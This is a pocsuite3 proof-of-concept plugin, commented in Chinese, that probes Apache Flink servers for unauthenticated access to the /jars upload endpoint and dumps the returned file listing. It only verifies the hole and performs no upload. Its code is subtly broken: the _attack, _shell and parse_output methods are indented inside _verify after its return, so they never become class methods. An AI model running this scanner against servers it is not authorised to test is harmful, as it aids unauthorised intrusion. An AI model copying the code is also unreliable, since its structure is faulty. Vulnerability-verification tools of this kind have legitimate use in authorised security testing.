"""
作者 charis
时间 2023-1-16
注意 检测未授权情况是否可以上传文件
"""
import time
import json
import re
from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, get_listener_ip, get_listener_port, VUL_TYPE
from pocsuite3.lib.core.enums import OS_ARCH, OS
from pocsuite3.lib.utils import random_str, generate_shellcode_list
from pocsuite3.modules.dnslog import Dnslog
from pocsuite3.modules.encryption import Encryption
from collections import OrderedDict
from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, VUL_TYPE
from pocsuite3.api import OptString


class DemoPOC(POCBase):
    vulID = '8'  # ssvid
    version = '1.0'
    author = ['charis']
    vulDate = '未知'
    createDate = '2023-01-06'
    updateDate = '2023-01-06'
    references = ['https://github.com/DawnFlame/POChouse/tree/main/Apache-Flink']
    name = 'Apache Flink未授权访问漏洞 jar文件上传'
    appPowerLink = 'https://flink.apache.org/'
    appName = 'Apache Flink'
    appVersion = 'Flink < 1.11.3 Flink < 1.12.0'
    vulType = VUL_TYPE.UNAUTHORIZED_ACCESS
    desc = '''Apache Flink是由Apache软件基金会开发的开源流处理框架，其核心是用Java和Scala编写的分布式流数据流引擎。Flink以数据并行和流水线方式执行任意流数据程序，Flink的流水线运行时系统可以执行批处理和流处理程序。此外，Flink的运行时本身也支持迭代算法的执行通过未授权可以上传任意jar包'''
    samples = []
    category = POC_CATEGORY.EXPLOITS.WEBAPP

    # 定义检查方法
    def _check(self, url):

        payloads = [
            r"/jars",
        ]

        for payload in payloads:
            vul_url = url + payload

            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0",
                "Accept": "application/json, text/plain, */*",
                "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
                "Accept-Encoding": "gzip, deflate",
                "Connection": "close",
                "Upgrade-Insecure-Requests": "1"
            }
            try:
                r = requests.get(vul_url, headers=headers)
                # print(r.text)
                if r.status_code == 200:
                    info = ""
                    dict = json.loads(r.text)
                    if "files" in r.text:
                        for key, value in dict.items():
                            info += "" + str(key) + "=" + str(value) + "\n"
                        return url, payload, info

            except requests.exceptions.RequestException as e:
                pass
        return False

    def _verify(self):

        result = {}
        p = self._check(self.url)
        if p:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = p[0]
            result['VerifyInfo']['payload'] = p[1]
            result['VerifyInfo']['Console data'] = p[2]
        return self.parse_output(result)

        def _attack(self):
            exit("无需获取shell")

        def _shell(self):
            exit("无需获取shell")

        def parse_output(self, result):
            output = Output(self)
            if result:
                output.success(result)
            else:
                output.fail('target is not vulnerable')
            return output

register_poc(DemoPOC)


